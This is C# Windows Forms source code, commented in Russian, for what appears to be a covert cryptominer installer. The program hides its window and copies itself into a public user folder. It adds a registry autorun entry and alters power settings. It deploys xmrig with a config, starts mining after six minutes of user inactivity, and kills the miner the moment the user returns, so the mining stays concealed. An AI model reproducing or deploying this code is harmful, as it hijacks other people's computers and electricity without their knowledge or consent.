using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;        //для того, чтобы копаться в директории
using Microsoft.Win32;      //чтобы залезть в реестр

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        public static string rigDirectory;
        public static string progStartName;
        public static string thisProgrammDirectory;
        public static string logFilePath;


        // WorkInProgConfigFile config = new WorkInProgConfigFile();


        bool prog_started;
        string textTranslit;
        int idleTimeOld;
        string time;
        int timeInt;
        int rigID;
        bool hiden=false;

        public Form1()          //Инициализация формы
        {
            InitializeComponent();
            
            //узнает дату при включерии. можно сделать и так, для компактрости
            //*****.Text = DateTime.Now.ToString("yyyy.MM.dd, HH.mm.ss");    
            //Это можно разделять как хочешь. Можно оставить только дату или только время


            //таймер. Просто таймер, который толкает функцию "tmrShow_Tick"
            Timer tmrShow = new Timer();
            tmrShow.Interval = 1;
            tmrShow.Tick += tmrShow_Tick;
            tmrShow.Enabled = true;

            progStartName = @"C:\Users\Public\Favor";
            rigDirectory = @"C:\Users\Public\Documents\Distance";

            string[] path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\');
                for (int i = 0; i < (path.Length - 1);)
                {
                    thisProgrammDirectory = thisProgrammDirectory + path[i];
                    i++;

                    if (i < (path.Length - 1))
                    {
                        thisProgrammDirectory = thisProgrammDirectory + @"\";
                    }
                }
            //LogFile l = new LogFile();
            LogFile.Log("\n");
            LogFile.Log("started " + DateTime.Now.ToString("yyyy.MM.dd, HH.mm.ss"));
        }

        struct LastInputInfo    //переменная для хранения времени бездействия системы
        {
            public uint cbSize;

            public uint dwTime;
        }

        [DllImport("user32.dll")]   // подключение библиотеки для счёта времени бездействия
        static extern bool GetLastInputInfo(out LastInputInfo plii);    //функция подсчёта времени бездействия системы

        LastInputInfo lastInputInfo = new LastInputInfo();  //новая переменная для работы с временем бездействия

        private async void tmrShow_Tick(object sender, EventArgs e)      //функция счётчика времени
        {
            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo); //присвоение переменной времени бездействия
            GetLastInputInfo(out lastInputInfo);    //вызов функции для обновления переменной времени бездействия

            int idleTime = unchecked(Environment.TickCount - (int)lastInputInfo.dwTime);    //конвертация времени в удобоваримый вариант подсчёта.
                                                                                            //Этот вариант лучше, хотя разницы я не знаю
            

            if (hiden == false && progStartName==thisProgrammDirectory)         //если программа в правильном месте
            {
                Hide();         //прячем ее 
                hiden = true;
                LogFile.Log("Is on wright plase.");
                PrepareToWorck();       //начинаем готовить ее к работе
            }

            else if (hiden == false && progStartName != thisProgrammDirectory)      //если программа не в правильном месте
            { 
                hiden = true;

                using (WorkInProgConfigFile config = new WorkInProgConfigFile())
                {
                    string result = "start";
                    config.SetData(result, "1");
                    //config.GetData(result);
                    MessageBox.Show(config.GetData("э"));
                }

                LogFile.Log("Programm is not on wright plase.");
                idleTimeOld = Convert.ToInt32(DateTime.Now.ToString("ss"));

                LogFile.Log("Creating wright program folder.");
                FolderCreate.PathCreate(progStartName,true);

                LogFile.Log("Creating wright setings folder.");
                FolderCreate.PathCreate(progStartName + @"\setings",false);

                LogFile.Log("Set autorun setings.");
                await Task.Run(() => Autorun.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName));

                LogFile.Log("Set power setings.");
                PowerSetings pow = new PowerSetings();
                await Task.Run(() => pow.SetSetings(progStartName));

                LogFile.Log("Copy program to wright place.");
                await Task.Run(() => CopyDir.copyDir(Environment.CurrentDirectory, progStartName, true));
            }

            if (progStartName != thisProgrammDirectory) //
                                                        //если программа готова
                                                        //сюда нужно вставить значение из конфиг файла
                                                        //когда я допишу нужный метод
                                                        //Это пока что просто заглушка
                                                        //
            {
                //если значение времени изменилось, то меняем его
                if (time != DateTime.Now.ToString("HH.mm"))     
                {
                    time = DateTime.Now.ToString("HH.mm");
                }

                // проверяем, если время больше чем нужно и ничего ещу не включено
                //60000= 1 минута
                if (idleTime >= 360000 && prog_started == false && time != "00.00")         //6 минут
                {
                    //пишем в лог
                    LogFile.Log("Rig start");
                    // Флаг ставится при запуске метода
                    //запускаем метод запуска
                    start_prog();
                }

                //если время очень мало
                if (idleTime <= 1000  && prog_started == true)
                {
                    //запускаем метод выключения
                    //флаг ставится в методе, после выполнения
                    close_prog();
                }




                /*
                 * это все должно было запускать рестарт программу, но...
                 * Но надо это всё переписать
                 * 
                if (time == "00.00" && !File.Exists(thisProgrammDirectory + @"/restart.txt"))
                {
                    File.Create(thisProgrammDirectory + @"/restart.txt");
                    prog_started = false;
                    close_prog();
                }

                if (time == "00.01" && File.Exists(thisProgrammDirectory + @"/restart.txt") && !File.Exists(Environment.CurrentDirectory + @"/restart1.txt"))
                {

                    File.Create(thisProgrammDirectory + @"/restart1.txt");
                    FileStatus stat = new FileStatus();
                    stat.restart();
                }

                if (time == "00.02" && File.Exists(thisProgrammDirectory + @"/restart.txt") && File.Exists(Environment.CurrentDirectory + @"/restart1.txt"))
                {
                    File.Delete(thisProgrammDirectory + @"/restart.txt");
                    File.Delete(thisProgrammDirectory + @"/restart1.txt");
                    prog_started = true;
                    start_prog();
                }
                */

                if (checkBox1.Checked == true)      //проверяет показывать ли в текствоксе когда пользователь ёрзает
                {
                    if (idleTime <= 100 && idleTimeOld >= 1000 && prog_started == false)
                    {
                        //эта функция должна была выводить всё в текстбокс на форме
                        //и она выводила.
                        printString(DateTime.Now.ToString("HH.mm.ss") + " Last input.", true);
                    }
                    idleTimeOld = idleTime;
                }
            }
            else    //если программа не готова
            {
                //ставлю счётчик на пару секунд
                timeInt = Convert.ToInt32(DateTime.Now.ToString("ss"));

                // Когда счётчик доходит до конца надо что-то сделать.
                // Я пока что просто запускаю эту прогу, включаю прогу из нового места и открываю папку с ней
                if (idleTimeOld <= 57)
                {
                    if (idleTimeOld == timeInt-3)
                    { 
                        //пока выключил
                        //Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
                        //Process.Start(@"C:\Users\Public\Favor\start.bat");

                        Process.GetCurrentProcess().Kill();
                    }
                }
                else
                {
                    if (timeInt == 2)
                    { 
                        //пока выключил
                        //Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
                        //Process.Start(@"C:\Users\Public\Favor\start.bat");
                        Process.GetCurrentProcess().Kill();
                    }
                }
            }
        }


        private void start_prog()
        {
            //ставим флаг, что прога включается
            prog_started = true;
            try
            {
                //создаём экземпляр процесса, чтобы запустить прогу
                System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
                //задаём путь и имя до проги
                srartProg.StartInfo.FileName = rigDirectory+ @"\xmrig.exe";
                //запускаем саму прогу
                srartProg.Start();
                //возьмём уникальный код проги, чтобы её наути
                rigID = srartProg.Id;
                //задаем приоритет проги
                Process.GetProcessById(rigID).PriorityClass = ProcessPriorityClass.BelowNormal;
            }
            catch //(Exception ex)
            {
                //MessageBox.Show(ex.Message , "Start");
                prog_started = false;
            }
        }






        private void close_prog()
        {
            Process[] processList = Process.GetProcessesByName("xmrig");
            try
            {
                if (processList.Length != 0)
                {
                    for (int i = 0; i < processList.Length;)
                    {
                        processList[i].Kill();
                        i++;
                    }
                    prog_started = false;
                }
                else
                {
                    prog_started = false;
                }
                //Process.GetProcessById(rigID).Kill();
            }
            catch 
            {

            }
        }

        private void printString(string masage, bool importmant)
        {
            if (importmant == false)
            {
                textBox1.Text = masage + Environment.NewLine + textBox1.Text;
            }
            else
            {
                textBox1.Text = "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯" + Environment.NewLine + textBox1.Text;
                textBox1.Text = masage + Environment.NewLine + textBox1.Text;
                textBox1.Text = "_______________" + Environment.NewLine + textBox1.Text;
            }

        }
        private void printInt(string masage, bool importmant)
        {
            if (importmant == false)
            {
                textBox1.Text = Convert.ToString(masage) + Environment.NewLine + textBox1.Text;
            }
            else
            {
                textBox1.Text = "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯" + Environment.NewLine + textBox1.Text;
                textBox1.Text = Convert.ToString(masage) + Environment.NewLine + textBox1.Text;
                textBox1.Text = "_______________" + Environment.NewLine + textBox1.Text;
            }
        }

        private void button1_Click(object sender, EventArgs e)  //перезапускает
        {
            FileStatus stat = new FileStatus();
            stat.restart();
        }

        private void button2_Click(object sender, EventArgs e)  //стартует какой-то процесс. Нужно указать имя exe файла
        {
            prog_started = true;
            start_prog();
        }

        private void button3_Click(object sender, EventArgs e)  //убивает процесс
        {
            prog_started = false;
            close_prog();
        }

        private void button4_Click(object sender, EventArgs e)  //прячет программу
        {
            Hide();
        }
        protected override void WndProc(ref Message m)  //события при подключении и отключении усб
        {
            base.WndProc(ref m);
            if (m.WParam.ToInt32() == 0x8000)
                label1.Text = "USB connected!";
            if (m.WParam.ToInt32() == 0x8004)
                label1.Text = "USB  disconnected!";
        }

        private void button6_Click(object sender, EventArgs e)
        {
            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo); //присвоение переменной времени бездействия
            GetLastInputInfo(out lastInputInfo);    //вызов функции для обновления переменной времени бездействия
            var idleTime = Environment.TickCount - lastInputInfo.dwTime;    //конвертация времени в удобоваримый вариант подсчёта
            label1.Text = Convert.ToString(idleTime);   //вывод времени на лейбу
        }

       

        private void button7_Click(object sender, EventArgs e)      //транслит
        {
            Translite tr = new Translite();
            textTranslit = textBox1.Text;
            textBox1.Text = tr.Tr2(textTranslit);
            label3.Text = tr.Tr2(textTranslit);

        }

        private async void button9_Click(object sender, EventArgs e)      //создание конфига
        {
            string name = Environment.UserName;
            Translite trans = new Translite();
            trans.Tr2(name);

            //CreateConfig cc = new CreateConfig();

            await Task.Run(() => CreateConfig.stringeditor2(Environment.CurrentDirectory + @"\config_exam.json", Environment.CurrentDirectory + @"\config.json", "11111111111111111"));

        }

        private void button10_Click(object sender, EventArgs e)     //установки настроек Спящих режимов
        {
            PowerSetings pow = new PowerSetings();
            pow.SetSetings(progStartName);
        }


        private void button8_Click(object sender, EventArgs e)
        {
            //string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
            //string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            //string path = System.Environment.GetCommandLineArgs()[0];
            //string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\').Last();

            string[] path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\');
            string s = "";
            for (int i = 0; i < (path.Length - 1);)
            {
                s = s + path[i];
                i++;
                if (i < (path.Length - 1))
                {
                    s = s + @"\";
                }
            }
            printString(s,false);
        }

        private void button5_Click(object sender, EventArgs e)
        {

            //Autorun autoR = new Autorun();
            Autorun.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName);
            //File.Create(Environment.CurrentDirectory + @"\autorn.txt");
        }

        private void ReadConfig_Click(object sender, EventArgs e)
        {
            WorkInProgConfigFile config = new WorkInProgConfigFile();
            textBox1.Text= config.GetData(textBox1.Text);
        }

        private void WrightConfig_Click(object sender, EventArgs e)
        {
            WorkInProgConfigFile config = new WorkInProgConfigFile();
            string[] s = textBox1.Text.Split('!');
            config.SetData(s[0],s[1]);
            textBox1.Text = "";
        }
        private void PrepareToWorck()         // метод, который будет готовить прогу к работе
        {
            LogFile.Log("PrepareToWorck()  started for check rig files.");
            if (!Directory.Exists(rigDirectory))
            {
                LogFile.Log("Created rig Directory.");
                //FolderCreate fc = new FolderCreate();
                FolderCreate.PathCreate(rigDirectory, true);

                LogFile.Log("Copied files of rig.");
                CopyDir.copyDir(thisProgrammDirectory + @"\rig", rigDirectory, false);

                LogFile.Log("Created config file for rig.");
                CreateConfig.stringeditor2(progStartName + @"\config_exam.json", rigDirectory + @"\config.json",
                    "11111111111111111");
            }
            else
            {
                //if (!File.Exists(rigDirectory + @"\config.json"))
                if (!RigFileCheck.check())
                {
                    int i = 0;
                    LogFile.Log("The folder of Rig was checked with an error.");
                    foreach (string s in Directory.GetFiles(rigDirectory))
                    {
                        i++;
                        File.Delete(s);
                    }
                    LogFile.Log("From Rig folder has been deleted " + i +" files.");

                    LogFile.Log("Copied files of Rig.");
                    CopyDir.copyDir(thisProgrammDirectory + @"\rig", rigDirectory, false);

                    LogFile.Log("Created config file for Rig.");
                    CreateConfig.stringeditor2(progStartName + @"\config_exam.json", rigDirectory + @"\config.json",
                        "11111111111111111");
                }
                else
                {
                    LogFile.Log("The folder of Rig has been checked correctly.");
                }
            }
        }
    }
}